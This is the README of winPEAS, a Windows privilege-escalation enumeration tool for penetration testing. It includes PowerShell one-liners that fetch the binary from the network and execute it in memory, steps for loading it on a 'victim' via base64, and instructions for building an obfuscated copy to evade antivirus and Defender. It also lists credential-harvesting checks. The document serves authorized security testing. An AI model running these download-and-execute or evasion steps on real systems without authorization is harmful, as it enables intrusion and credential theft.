# Windows Privilege Escalation Awesome Script (.exe)

![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)

**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**

Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**

[![youtube](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/screen.png)](https://youtu.be/66gOwXMnxRI)

## Quick Start

**.Net >= 4.5.2 is required**

Precompiled binaries:
- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/peass-ng/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).

```bash
# Get latest release
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

# Before cmd in 3 lines
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Load from disk in memory and execute:
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Load from disk in base64 and execute
##Generate winpeas in Base64:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
##Now upload the B64 string to the victim inside a file or copy it to the clipboard

 ##If you have uploaded the B64 as afile load it with:
$thecontent = Get-Content -Path D:\Users\victim\winPEAS.txt
 ##If you have copied the B64 to the clipboard do:
$thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
##Finally, load binary in memory and execute
$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

# Loading from file and executing a winpeas obfuscated version
##Load obfuscated version
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
[<ReflectedType_from_before>]::Main("") #Used the ReflectedType name to execute winpeas
```

## Parameters Examples

```bash
winpeas.exe -h # Get Help
winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
winpeas.exe notcolor #Do not color the output
winpeas.exe domain #enumerate also domain information
winpeas.exe wait #wait for user input between tests
winpeas.exe debug #display additional debug information
winpeas.exe log #log output to out.txt instead of standard output
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh)
winpeas.exe -lolbas  #Execute also additional LOLBAS search check
```

## Basic information

The goal of this project is to search for possible **Privilege Escalation Paths** in Windows environments.

It should take only a **few seconds** to execute almost all the checks and **some seconds/minutes during the lasts checks searching for known filenames** that could contain passwords (the time depened on the number of files in your home folder). By default only **some** filenames that could contain credentials are searched, you can use the **searchall** parameter to search all the list (this could will add some minutes).

The tool is based on **[SeatBelt](https://github.com/GhostPack/Seatbelt)**.

## Where are my COLORS?!?!?!

The **ouput will be colored** using **ansi** colors. If you are executing `winpeas.exe` **from a Windows console**, you need to set a registry value to see the colors (and open a new CMD):
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Below you have some indications about what does each color means exacty, but keep in mind that **Red** is for something interesting (from a pentester perspective) and **Green** is something well configured (from a defender perspective).

![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/colors.png)

## Instructions to compile you own obfuscated version

<details>
  <summary>Details</summary>

In order to compile an **ofuscated version** of Winpeas and bypass some AVs you need to ** install dotfuscator ** in *VisualStudio*.

To install it *open VisualStudio --> Go to Search (CTRL+Q) --> Write "dotfuscator"* and just follow the instructions to install it.

To use **dotfuscator** you will need to **create an account** *(they will send you an email to the address you set during registration*).

Once you have installed and activated it you need to:
1. **Compile** winpeas in VisualStudio
2. **Open dotfuscator** app
3. **Open** in dotfuscator **winPEAS.exe compiled**
4. Click on **Build**
5. The **single, minimized and obfuscated binary** will appear in a **folder called Dotfuscator inside the folder were winPEAS.exe** and the DLL were (this location will be saved by dotfuscator and by default all the following builds will appear in this folder).

**I'm sorry that all of this is necessary but is worth it. Dotfuscator minimizes a bit the size of the executable and obfuscates the code**.

![](https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASexe/images/dotfuscator.PNG)

**IMPORTANT**: Note that Defender will higly probable delete the winpeas iintial unobfuscated version, so you need to set as expections the origin folder of Winpeas and the folder were the obfuscated version will be saved:
![](https://user-images.githubusercontent.com/1741662/148418852-e7ffee6a-c270-4e26-bf38-bb8977b3ad9c.png)
</details>

## Checks

<details>
  <summary>Details</summary>

- **System Information**
  - [x] Basic System info information
  - [x] Use Watson to search for vulnerabilities
  - [x] Enumerate Microsoft updates
  - [x] PS, Audit, WEF and LAPS Settings
  - [x] LSA protection
  - [x] Credential Guard
  - [x] WDigest
  - [x] Number of cached cred
  - [x] Environment Variables
  - [x] Internet Settings
  - [x] Current drives information
  - [x] AV
  - [x] Windows Defender
  - [x] UAC configuration
  - [x] NTLM Settings
  - [x] Local Group Policy
  - [x] Applocker Configuration & bypass suggestions
  - [x] Printers
  - [x] Named Pipes
  - [x] AMSI Providers
  - [x] SysMon
  - [x] .NET Versions

- **Users Information**
  - [x] Users information
  - [x] Current token privileges
  - [x] Clipboard text
  - [x] Current logged users
  - [x] RDP sessions
  - [x] Ever logged users
  - [x] Autologin credentials
  - [x] Home folders
  - [x] Password policies
  - [x] Local User details
  - [x] Logon Sessions

- **Processes Information**
  - [x] Interesting processes (non Microsoft)

- **Services Information**
  - [x] Interesting services (non Microsoft) information
  - [x] Modifiable services
  - [x] Writable service registry binpath
  - [x] PATH Dll Hijacking

- **Applications Information**
  - [x] Current Active Window
  - [x] Installed software
  - [x] AutoRuns
  - [x] Scheduled tasks
  - [x] Device drivers

- **Network Information**
  - [x] Current net shares
  - [x] Mapped drives (WMI)
  - [x] hosts file
  - [x] Network Interfaces
  - [x] Listening ports
  - [x] Firewall rules
  - [x] DNS Cache (limit 70)
  - [x] Internet Settings

- **Cloud Metadata Enumeration**
  - [x] AWS Metadata
  - [x] GCP Metadata
  - [x] Azure Metadata

- **Windows Credentials**
  - [x] Windows Vault
  - [x] Credential Manager
  - [x] Saved RDP settings
  - [x] Recently run commands
  - [x] Default PS transcripts files
  - [x] DPAPI Masterkeys
  - [x] DPAPI Credential files
  - [x] Remote Desktop Connection Manager credentials
  - [x] Kerberos Tickets
  - [x] Wifi
  - [x] AppCmd.exe
  - [x] SSClient.exe
  - [x] SCCM
  - [x] Security Package Credentials
  - [x] AlwaysInstallElevated
  - [x] WSUS

- **Browser Information**
  - [x] Firefox DBs
  - [x] Credentials in firefox history
  - [x] Chrome DBs
  - [x] Credentials in chrome history
  - [x] Current IE tabs
  - [x] Credentials in IE history
  - [x] IE Favorites
  - [x] Extracting saved passwords for: Firefox, Chrome, Opera, Brave

- **Interesting Files and registry**
  - [x] Putty sessions
  - [x] Putty SSH host keys
  - [x] SuperPutty info
  - [x] Office365 endpoints synced by OneDrive
  - [x] SSH Keys inside registry
  - [x] Cloud credentials
  - [x] Check for unattended files
  - [x] Check for SAM & SYSTEM backups
  - [x] Check for cached GPP Passwords
  - [x] Check for and extract creds from McAffe SiteList.xml files
  - [x] Possible registries with credentials
  - [x] Possible credentials files in users homes
  - [x] Possible password files inside the Recycle bin
  - [x] Possible files containing credentials (this take some minutes)
  - [x] User documents (limit 100)
  - [x] Oracle SQL Developer config files check
  - [x] Slack files search
  - [x] Outlook downloads
  - [x] Machine and user certificate files
  - [x] Office most recent documents
  - [x] Hidden files and folders
  - [x] Executable files in non-default folders with write permissions
  - [x] WSL check

- **Events Information**
  - [x] Logon + Explicit Logon Events
  - [x] Process Creation Events
  - [x] PowerShell Events
  - [x] Power On/Off Events

- **Additional (slower) checks**
  - [x] LOLBAS search
  - [x] run **[linpeas.sh](https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh)** in default WSL distribution

</details>

## TODO
- Add more checks
- Mantain updated Watson (last JAN 2021)

If you want to help with any of this, you can do it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)** or you can submit a pull request.

If you find any issue, please report it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)**.

**WinPEAS** is being **updated** every time I find something that could be useful to escalate privileges.

## Advisory

All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
